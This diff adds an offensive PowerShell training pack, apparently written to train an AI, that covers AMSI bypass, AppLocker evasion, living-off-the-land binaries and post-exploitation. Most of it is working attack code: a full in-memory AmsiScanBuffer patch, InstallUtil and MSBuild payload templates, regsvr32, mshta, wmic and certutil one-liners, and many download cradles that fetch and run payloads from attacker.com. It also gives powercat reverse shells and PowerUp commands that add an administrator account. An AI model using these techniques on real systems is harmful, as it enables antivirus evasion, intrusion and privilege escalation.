@@ -1,0 +1,350 @@
+================================================================================
+TITAN AI — TRAINING PACK 047: OFFENSIVE POWERSHELL AND LIVING OFF THE LAND
+AMSI BYPASS, CONSTRAINED LANGUAGE, LOLBINS, OBFUSCATION, APPLOCKER BYPASS
+================================================================================
+
+================================================================================
+PART 1: POWERSHELL SECURITY ARCHITECTURE
+================================================================================
+
+--- POWERSHELL DEFENSE MECHANISMS ---
+
+SCRIPT BLOCK LOGGING (Event ID 4104):
+  Logs ALL executed PowerShell code — even obfuscated, decoded, or dynamically constructed.
+  The PowerShell runtime decodes and logs before execution.
+  
+  Critical: If enabled, attackers cannot evade by obfuscating. The decoded code is logged.
+  Enabled via GPO: Computer Configuration → Administrative Templates → Windows Components → PowerShell
+  Set "Turn on PowerShell Script Block Logging" → Enabled.
+  
+  Bypass: PowerShell downgrade to v2 (if installed).
+  PowerShell v2 doesn't support script block logging.
+  powershell -Version 2 -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+  
+  Detection: Event ID 400 with HostVersion showing v2.0. Flag all PS v2 usage.
+
+CONSTRAINED LANGUAGE MODE (CLM):
+  Activated by: AppLocker (in audit or enforce mode) or Windows Defender Application Control (WDAC).
+  Restricts: .NET method calls, COM objects, certain language elements.
+  
+  Check current mode:
+  $ExecutionContext.SessionState.LanguageMode
+  # FullLanguage = unrestricted
+  # ConstrainedLanguage = CLM active
+
+EXECUTION POLICY:
+  NOT a security boundary. Easy to bypass. Defense in depth only.
+  Bypass methods:
+  powershell -exec bypass script.ps1
+  powershell -ep bypass script.ps1
+  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted
+  cat script.ps1 | powershell -  # Pipe bypasses policy
+  powershell -c "iex (cat script.ps1 | out-string)"
+  Get-Content script.ps1 | Invoke-Expression
+  [ScriptBlock]::Create((Get-Content script.ps1)).Invoke()
+
+AMSI (ANTI-MALWARE SCAN INTERFACE):
+  Hooks into PowerShell, JScript, VBScript, .NET, Office VBA.
+  Sends script content to registered AV engine before execution.
+  AV detects malicious: Execution blocked. AMSI_RESULT_DETECTED returned.
+  
+  Architecture:
+  PowerShell.exe → calls AmsiScanBuffer() in amsi.dll → passes to Windows Defender (or other AV).
+  amsi.dll: Loaded into PowerShell process. In-process check.
+  Bypass: Patch amsi.dll in memory → always return "clean" result.
+
+================================================================================
+PART 2: AMSI BYPASS TECHNIQUES
+================================================================================
+
+--- TECHNIQUE 1: REFLECTION-BASED AMSI BYPASS ---
+
+Classic (now heavily detected, use as educational reference):
+  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+How it works:
+  AmsiUtils: Internal PS class managing AMSI state.
+  amsiInitFailed: Boolean flag. If true: AMSI considered failed to initialize → skips scanning.
+  SetValue($null, $true): Set the field to true via reflection.
+  AMSI: Now believes initialization failed. Doesn't scan subsequent commands.
+  
+  AV detection: The string "amsiInitFailed" and "AmsiUtils" are signatures.
+  Obfuscation needed.
+
+--- TECHNIQUE 2: MEMORY PATCH (P/INVOKE) ---
+
+Directly patch AmsiScanBuffer function in memory:
+  
+  $Win32 = @"
+  using System;
+  using System.Runtime.InteropServices;
+  public class Win32 {
+      [DllImport("kernel32")]
+      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+      [DllImport("kernel32")]
+      public static extern IntPtr LoadLibrary(string name);
+      [DllImport("kernel32")]
+      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+  }
+  "@
+  
+  Add-Type $Win32
+  
+  $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+  $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
+  
+  $p = 0
+  [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+  
+  # Patch bytes: ret instruction (0xC3) — function immediately returns
+  $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+  # 0xB8 = mov eax, 0x80070057 (AMSI_RESULT_NOT_DETECTED equivalent error)
+  # 0xC3 = ret
+  
+  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+  
+  # AMSI: AmsiScanBuffer now immediately returns AMSI_RESULT_NOT_DETECTED. Everything passes.
+
+--- TECHNIQUE 3: COMPLUS_VERSION ENVIRONMENT VARIABLE ---
+
+Force specific .NET runtime version that doesn't load AMSI:
+  $env:COMPLUS_Version = "v2.0.50727"
+  # Starts PowerShell in .NET 2.0 compatibility mode
+  # AMSI provider not compatible with this old version → not loaded
+  
+  # Then execute payload in new process with this environment
+
+--- TECHNIQUE 4: PROCESS FORK + HOLLOW ---
+
+Start fresh PowerShell process with AMSI disabled from the start.
+Before AMSI DLL loads: Patch process memory.
+Rarely implemented manually; more common in advanced tools.
+
+================================================================================
+PART 3: APPLOCKER BYPASS
+================================================================================
+
+--- APPLOCKER BASICS ---
+
+AppLocker: Whitelist application execution.
+  Rules for: Executables (.exe), Scripts (.ps1, .vbs, .bat), DLLs, Installers (.msi, .msp).
+  Default rules: Allow %SYSTEM32%\*, %PROGRAMFILES%\*, %WINDIR%\*, signed by Microsoft.
+  
+  Block: Unknown executables. Scripts from user writeable directories.
+
+DEFAULT WRITEABLE LOCATIONS ALLOWED BY APPLOCKER:
+  These directories are often writable by non-admin AND in AppLocker whitelist:
+  C:\Windows\Tasks
+  C:\Windows\Temp
+  C:\Windows\tracing
+  C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+  C:\Windows\System32\Tasks
+  C:\Windows\SysWOW64\Tasks
+  C:\Windows\Registration\CRMLog
+  C:\ProgramData\Microsoft\Windows\DeviceMetadataCache
+  
+  BYPASS: Drop script in these locations → Execute.
+
+APPLOCKER BYPASS: INSTALLUTIL.EXE
+  InstallUtil: .NET binary from %WINDIR%\Microsoft.NET\Framework64\.
+  Whitelisted (signed Microsoft binary).
+  Loads: .NET assembly from specified path. Calls install/uninstall methods.
+  
+  Malicious .NET DLL with install method containing shellcode:
+  using System;
+  using System.ComponentModel;
+  using System.Runtime.InteropServices;
+  
+  [System.ComponentModel.RunInstaller(true)]
+  public class Sample : System.Configuration.Install.Installer {
+      public override void Uninstall(System.Collections.IDictionary savedState) {
+          // Execute shellcode or download and run payload
+          System.Diagnostics.Process.Start("powershell.exe", "-exec bypass -c 'payload'");
+      }
+  }
+  
+  // Compile to bypass.dll
+  // Run: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U bypass.dll
+
+APPLOCKER BYPASS: MSBUILD.EXE
+  MSBuild: Microsoft build engine. Whitelisted. Executes C# from XML project file.
+  
+  <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Target Name="Hello">
+      <ClassExample />
+    </Target>
+    <UsingTask
+      TaskName="ClassExample"
+      TaskFactory="CodeTaskFactory"
+      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+      <Task>
+        <Code Type="Class" Language="cs">
+        <![CDATA[
+          using System;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+          public class ClassExample : Task, ITask {
+              public override bool Execute() {
+                  System.Diagnostics.Process.Start("calc.exe"); // Replace with payload
+                  return true;
+              }
+          }
+        ]]>
+        </Code>
+      </Task>
+    </UsingTask>
+  </Project>
+  
+  // Execute: msbuild.exe payload.xml
+
+OTHER LOLBIN BYPASSES:
+  regsvr32.exe: Register COM DLL. Can execute JScript/VBScript via .sct (scriptlet) files.
+    regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
+    (Used by APT32, DarkHydrus. Squiblydoo attack)
+  
+  regasm.exe: Similar to InstallUtil for .NET assemblies.
+  
+  wmic.exe: Execute XSL transforms with embedded JScript.
+    wmic os get /FORMAT:"http://attacker.com/payload.xsl"
+  
+  mshta.exe: Execute HTML applications (.hta) from URL or file.
+    mshta.exe http://attacker.com/payload.hta
+  
+  wscript.exe / cscript.exe: VBScript and JScript execution.
+    wscript.exe payload.vbs
+  
+  rundll32.exe: Execute specific DLL exports.
+    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...
+  
+  certutil.exe: Download files. Decode base64.
+    certutil -urlcache -f http://attacker.com/beacon.exe beacon.exe
+    certutil -decode encoded.b64 beacon.exe
+
+================================================================================
+PART 4: ADVANCED OBFUSCATION
+================================================================================
+
+--- STRING OBFUSCATION IN POWERSHELL ---
+
+Tick marks (backtick escape):
+  `i`e`x   ← Same as iex (Invoke-Expression)
+  `i`n`v`o`k`e`-`e`x`p`r`e`s`s`i`o`n
+
+String concatenation:
+  'i' + 'e' + 'x'
+  ('i','e','x' -join '')
+
+Character codes:
+  [char]105 + [char]101 + [char]120  ← 'i','e','x'
+  [string][char[]]@(105,101,120)
+
+Variable assignment split:
+  $a = 'Inv';$b = 'oke-Ex';$c = 'pression'; &($a+$b+$c)
+
+Reversing strings:
+  ('noisserpxE-ekovnI' -split '' | Select-Object -Last (('noisserpxE-ekovnI').Length) | %{$_}) -join ''
+  # = Invoke-Expression
+
+Base64 encoding (built-in PS):
+  $cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/ps.ps1")'
+  $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+  $encoded = [Convert]::ToBase64String($bytes)
+  powershell.exe -encodedCommand $encoded
+
+FORMAT OPERATOR:
+  '{0}{1}{2}' -f 'Inv','oke-',('Exp'+'ression')
+
+--- INVOKE-OBFUSCATION ---
+
+PowerShell script obfuscation tool (Daniel Bohannon).
+Multiple obfuscation techniques: TOKEN, AST, STRING, ENCODING, LAUNCHER, COMPRESS.
+
+TOKEN obfuscation: Rearranges and obfuscates at token level.
+  Input: Invoke-Expression "Write-Host 'Hello'"
+  Output: .( $pSHoMe[4]+$PShoMe[30]+'x')([CHAr[]](...) -JOin '')
+  
+  Semantically identical. Visually unrecognizable.
+
+INVOKE-DOSFUSCATION: Obfuscates Windows command-line payloads.
+REVOKE-OBFUSCATION: Detect obfuscated PowerShell (defender tool, counter to above).
+
+--- CHAMELEON ---
+
+Tool: Bypass AMSI by mutating script content just enough to avoid known signatures.
+Approach: Remove comments, rename variables, add junk, reorder statements.
+Goal: Same logic, different byte pattern. AMSI signatures miss.
+
+================================================================================
+PART 5: POWERSHELL FOR POST-EXPLOITATION
+================================================================================
+
+--- POWERUP (PRIVILEGE ESCALATION) ---
+
+PowerUp: PowerShell privilege escalation script.
+  
+  Import-Module .\PowerUp.ps1
+  Invoke-AllChecks      # Run all checks. Output vulnerabilities.
+  
+  Checks:
+  Get-ServiceUnquoted: Services with unquoted paths + spaces.
+    C:\Program Files\My Service\service.exe  → attacker creates C:\Program.exe
+  
+  Get-ModifiableServiceFile: Service binary writable by current user.
+  Get-ModifiableService: Service configuration editable (change binary path).
+  Get-RegAlwaysInstallElevated: MSI installs always run as SYSTEM if reg key set.
+  Get-UnattendedInstallFile: Unattended install XML files contain cleartext passwords.
+  
+  Invoke-ServiceAbuse: Exploit modifiable service to get SYSTEM.
+    Invoke-ServiceAbuse -Name VulnerableService -Command "net user hacker Password1 /add"
+    Invoke-ServiceAbuse -Name VulnerableService -Command "net localgroup administrators hacker /add"
+
+--- POWERCAT (POWERSHELL NETCAT) ---
+
+  powercat -c 192.168.1.100 -p 4444 -e powershell    # Reverse shell
+  powercat -l -p 4444 -e powershell                   # Bind shell
+  powercat -c 192.168.1.100 -p 4444 -e powershell -g > payload.ps1  # Generate one-liner
+  
+  # File transfer:
+  # Sender:
+  powercat -c 192.168.1.100 -p 8000 -i C:\file.exe
+  # Receiver:
+  powercat -l -p 8000 -of C:\received.exe
+
+--- DOWNLOAD CRADLES ---
+
+Downloading and executing payloads without writing to disk:
+
+  # Classic (detectable by EDR - common string patterns):
+  IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+  
+  # WebRequest:
+  IEX (Invoke-WebRequest 'http://attacker.com/payload.ps1').Content
+  
+  # BitsTransfer (background download, less suspicious):
+  Import-Module BitsTransfer
+  Start-BitsTransfer -Source 'http://attacker.com/payload.exe' -Destination 'C:\Windows\Temp\update.exe'
+  
+  # DNS TXT record download:
+  IEX ([System.Text.Encoding]::UTF8.GetString((Resolve-DnsName -Type TXT attacker.com).Strings))
+  
+  # HTTPS with certificate bypass:
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+  IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1')
+  
+  # In-memory .NET assembly load (fileless):
+  $bytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/assembly.dll')
+  $assembly = [System.Reflection.Assembly]::Load($bytes)
+  $assembly.GetType('Namespace.Class').GetMethod('Main').Invoke($null, @())
+
+================================================================================
+END OF PACK 047: OFFENSIVE POWERSHELL
+Total: PS defense mechanisms (script block logging/CLM/execution policy — all bypass
+methods), AMSI architecture and bypass techniques (reflection/memory patch P/Invoke
+with full code/COMPLUS_VERSION), AppLocker whitelist bypass (default writable paths,
+InstallUtil/MSBuild with full XML payload, regsvr32 Squiblydoo, wmic/mshta/certutil
+LOLBINs), string obfuscation (tick marks/concat/char codes/base64/format operator),
+Invoke-Obfuscation technique overview, PowerUp privilege escalation checks (unquoted
+paths/modifiable services/AlwaysInstallElevated), PowerCat, download cradles (all
+variants including DNS TXT and in-memory assembly load).
+================================================================================
